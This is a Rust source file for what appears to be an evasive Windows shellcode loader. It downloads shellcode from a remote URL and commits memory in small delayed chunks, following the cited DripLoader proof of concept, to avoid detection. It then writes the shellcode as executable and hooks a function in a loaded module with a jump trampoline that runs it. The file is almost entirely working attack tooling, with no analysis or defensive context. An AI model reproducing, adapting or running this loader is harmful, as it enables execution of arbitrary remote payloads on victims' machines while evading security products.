use std::{fs::File, io::Read};
use std::mem;
use crate::externs;
use std::ptr::{null, null_mut};
use reqwest;
use std::{slice, thread, time::Duration, ffi::CString};
use crate::delay_mills;



// Simple delay func
pub fn delay(time: u64) {
    thread::sleep(Duration::from_millis(time));
}

pub fn download_file(url: &str) -> Vec<u8> {
    let mut shellcode: Vec<u8> = Vec::new();

    match reqwest::blocking::get(url) {
        Ok(response) => {
            shellcode = match response.bytes() {
                Ok(bytes) => bytes.to_vec(),
                Err(e) => {
                    println!("[!] Error getting shellcode: {}", e);
                    return Vec::new();
                }
            };
            return shellcode;
        },
        Err(e) => {
            println!("[!] Error making request: {}", e);
            return Vec::new();
        }
    }

}


pub fn read_file(path: &str) -> Option<Vec<u8>> {
    let mut file_handle = match File::open(path) {
        Ok(file) => file,
        Err(e) => { 
            println!("Error opening file: {}", e);
            return None;
        }
    };

    let mut data: Vec<u8> = Vec::new();
    match file_handle.read_to_end(&mut data) {
        Ok(_) => { 
            Some(data)
        },
        Err(e) => { 
            println!("Error reading file: {}", e); 
            return None;
        }
    }
}


// Function to prepare a patch that will jump to our shellcode memory location
pub fn prepare_jump(addr_to_jmp: externs::LPVOID, mod_name: &str, func_name: &str) -> externs::LPVOID {
    println!("[+] Preparing jump for shellcode execution");
    println!("[+] Loading module: {}", mod_name);

    unsafe {
        // Prepare the jump shellcode
        let jump_bytes = slice::from_raw_parts(&addr_to_jmp as *const _ as *const u8, size_of::<externs::LPVOID>());
        let mut jmp_sc = [
            0xB8, jump_bytes[0], jump_bytes[1], jump_bytes[2], jump_bytes[3],
            0xFF, 0xE0,
        ];
        let mut jmp_sc_len = jmp_sc.len();

        // Load the specified module
        let mod_name_c = CString::new(mod_name).unwrap();
        let mod_hand: externs::HANDLE = externs::load_lib(
            mod_name_c.as_ptr(),
            null_mut(),
            externs::DONT_RESOLVE_DLL_REFERENCES
        );
        if mod_hand.is_null() {
            panic!("[!] Cant open a handle to module");
        }

        // Find the address of the function
        let func_name_c = CString::new(func_name).unwrap();
        let func_addr = externs::get_address(mod_hand, func_name_c.as_ptr());
        if func_addr.is_null() {
            panic!("[!] Cant find provided function address");
        }

        // Calculate the offset
        let offset_to_func = (func_addr as usize) - (mod_hand as usize);
        println!("[+] Address of {} is {:?}, offset from the start: 0x{:x}", func_name, func_addr, offset_to_func);

        // Enumerate the modules in the process
        println!("[+] Enumerating currently loaded modules");
        let mut module_handles = vec![null_mut(); 1024];
        let mut cb_needed: externs::DWORD = 0;
        let mut status = externs::enum_mods(
            externs::SELF_HANDLE,
            module_handles.as_mut_ptr(),
            (module_handles.len() * size_of::<externs::HANDLE>()) as u32,
            &mut cb_needed
        );
        if status == 0 {
            panic!("[!] Could not enumerate the process's loaded modules");
        }
        module_handles.resize(cb_needed as usize / size_of::<externs::HANDLE>(), null_mut());

        // Find the target module and calculate the specified function address
        println!("[+] Searching for the specified function and calculating its address");
        let mut jmp_func_addr = null_mut();
        for &module_handle in &module_handles {
            if module_handle.is_null() {
                continue;
            }

            let mut module_name = vec![0u8; 260];
            status = externs::get_mod_name(
                externs::SELF_HANDLE,
                module_handle,
                module_name.as_mut_ptr() as *mut i8,
                module_name.len() as externs::DWORD
            );
            if status == 0 {
                panic!("[!] Can find the module name");
            }

            let module_name = String::from_utf8_lossy(&module_name).trim_end_matches('\0').to_string();
            if module_name.ends_with(mod_name) {
                jmp_func_addr = (module_handle as usize + offset_to_func) as externs::LPVOID;
                println!("[+] Jump function's address {:?}", jmp_func_addr);
                break;
            }
        }

        // Overwrite the first few bytes with the trampoline to our shellcode
        println!("[+] Preparing our jump patch");
        println!("\tMaking memory writable");
        let mut old_protect: externs::DWORD = 0;
        let mut status: externs::NTSTATUS = externs::ntProtect(
            externs::SELF_HANDLE,
            &mut jmp_func_addr,
            &mut jmp_sc_len,
            externs::PAGE_READWRITE,
            &mut old_protect
        );
        if status != 0 {
            panic!("[!] Could not change memory protection of {:?}, status: {}", jmp_func_addr, status);
        }

        // Hook the start of the function with jmp
        println!("\tWriting jump patch");
        let mut written = 0;
        status = externs::ntWrite(
            externs::SELF_HANDLE,
            jmp_func_addr,
            jmp_sc.as_ptr() as externs::LPCVOID,
            jmp_sc.len(),
            &mut written
        );

        if status != 0 && written != jmp_sc_len {
            panic!("[!] Could not write all of the jmp shellcode, status: 0x{:x}, written: {}", status, written);
        }

        // Change the memory protection back to normal
        println!("\tSwitching back memory protection");
        let mut sc_len = jmp_sc.len();
        status = externs::ntProtect(
            externs::SELF_HANDLE,
            &mut jmp_func_addr,
            &mut sc_len,
            old_protect,
            &mut old_protect
        );
        if status != 0 {
            panic!("[!] Could not change back memory protection status: 0x{:x}", status);
        }       
        return jmp_func_addr;
    }
}




// Drip allocation, based on this PoC
// https://github.com/xuanxuan0/DripLoader/blob/master/DripLoader
pub fn drip_alloc(shellcode: Vec<u8>) -> Vec<externs::LPVOID> {

    let mut mem_page_size: usize = 4096;        //4KB  min page size
    let mut mem_alloc_gran: usize = 65536;      //64KB min allocation granularity 0x10000
    let sc_len: usize = shellcode.len();
    println!("[+] Shellcode size: {}", sc_len);

    let mut reserve_parts: usize = sc_len / mem_alloc_gran;

    let reserve_remain = sc_len % mem_alloc_gran;

    if reserve_remain > 0 {
        reserve_parts = reserve_parts + 1;
    }

    println!("[+] Memory reserved regions required: {}", reserve_parts);

    let mut memory_blocks: Vec<externs::LPVOID> = Vec::new();

    unsafe {
        let mut temp_addr: externs::LPVOID = find_suitable_base(
            externs::SELF_HANDLE,
            mem_page_size,
            mem_alloc_gran,
            reserve_parts
        );

        // Reserving no access memory at first
        for i in 0..reserve_parts {
            // Make a small delay
            delay(delay_mills);

            let status: externs::NTSTATUS = externs::ntAllocator(
                externs::SELF_HANDLE,
                &mut temp_addr,
                0,
                &mut mem_alloc_gran,
                externs::MEM_RESERVE,
                externs::PAGE_NOACCESS
            );

            if status != 0 {
                panic!("[!] Failed reserving memory, status: 0x{:x}", status);
            }

            println!("\tBlock: {}, address: {:?}", i , temp_addr);
            memory_blocks.push(temp_addr);
            temp_addr = (temp_addr as usize + mem_alloc_gran) as externs::LPVOID;
        }

        println!("[+] Starting to commit memory at 4KB chunks and write the shellcode");
        let mut shellcode_offset = 0;
        // Commit the required memory from the reserved block
        // write the shellcode and change the protection
        for base_addr in memory_blocks.iter() {

            println!("\tProcessing memory commits in block {:?}", base_addr);
            for i in 0..(mem_alloc_gran / mem_page_size) {
                let mut chunk_base = (*base_addr as usize + (i * mem_page_size)) as externs::LPVOID;

                // Small delay
                delay(delay_mills/5);

                let mut status: externs::NTSTATUS = externs::ntAllocator(
                    externs::SELF_HANDLE,
                    &mut chunk_base,
                    0,
                    &mut mem_page_size,
                    externs::MEM_COMMIT,
                    externs::PAGE_READWRITE
                );

                if status != 0 {
                    panic!("[!] Failed reserving memory, status: 0x{:x}", status);
                }

                let end = std::cmp::min(shellcode_offset + mem_page_size, shellcode.len());
                let to_write: &[u8] = &shellcode[shellcode_offset..end];

                let mut written = 0;
                status = externs::ntWrite(
                    externs::SELF_HANDLE,
                    chunk_base,
                    to_write.as_ptr() as externs::LPCVOID,
                    to_write.len(),
                    &mut written
                );

                if status != 0 && written != to_write.len() {
                    panic!("[!] Failed writing shellcode to chunk, status: {}, written: {}", status, written);
                }

                let mut old_protect = 0;
                status = externs::ntProtect(
                    externs::SELF_HANDLE,
                    &mut chunk_base,
                    &mut mem_page_size,
                    externs::PAGE_EXECUTE_READ,
                    &mut old_protect
                );

                if status != 0 {
                    panic!("[!] Could not change the memory protection");
                }

                shellcode_offset = shellcode_offset + written;
            }
        }
    }
    return memory_blocks;
}


// Find a suitable base address for allocation
pub fn find_suitable_base(
    proc_hand: externs::HANDLE, 
    page_size: usize, 
    alloc_gran: usize, 
    reserve_parts: usize
) -> externs::LPVOID {

    let mut memory_basic_info: externs::MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };

    println!("[+] Searching for potential base address for memory allocation");
    for base_addr in externs::VC_PREF_BASES {
    
        unsafe {
            let mem_query = externs::memQuery(
                externs::SELF_HANDLE,
                base_addr as externs::LPCVOID,
                &mut memory_basic_info,
                mem::size_of::<externs::MEMORY_BASIC_INFORMATION>()
            );
            println!("[+] Query for address: 0x{:x}", &base_addr);
            println!("\t Memory block status: 0x{:x}", memory_basic_info.State);
            println!("\t Memory block size: {:?}", memory_basic_info.RegionSize);
            println!("\t Memory block protection: 0x{:x}", memory_basic_info.Protect);

            if mem_query == 0 || memory_basic_info.State != externs::MEM_FREE {
                continue;
            }

            // Assume that its suitable and check for contiguous free blocks
            let mut its_suitable = true;

            for i in 0..reserve_parts {
                let current_base = (base_addr + (i * alloc_gran)) as externs::LPCVOID;

                let query = externs::memQuery(
                    externs::SELF_HANDLE,
                    current_base,
                    &mut memory_basic_info,
                    mem::size_of::<externs::MEMORY_BASIC_INFORMATION>()
                );

                if query == 0 || memory_basic_info.State != externs::MEM_FREE {
                    its_suitable = false;
                    break;
                }

                if its_suitable {
                    println!("[+] Found suitable base address: {:?}, reserving chunks", base_addr as externs::LPVOID);
                    return (base_addr as externs::LPVOID);
                }
            }
        }
    }
    println!("[!] No suitable base address found, returning NULL, the program may fail..");
    return null_mut();
}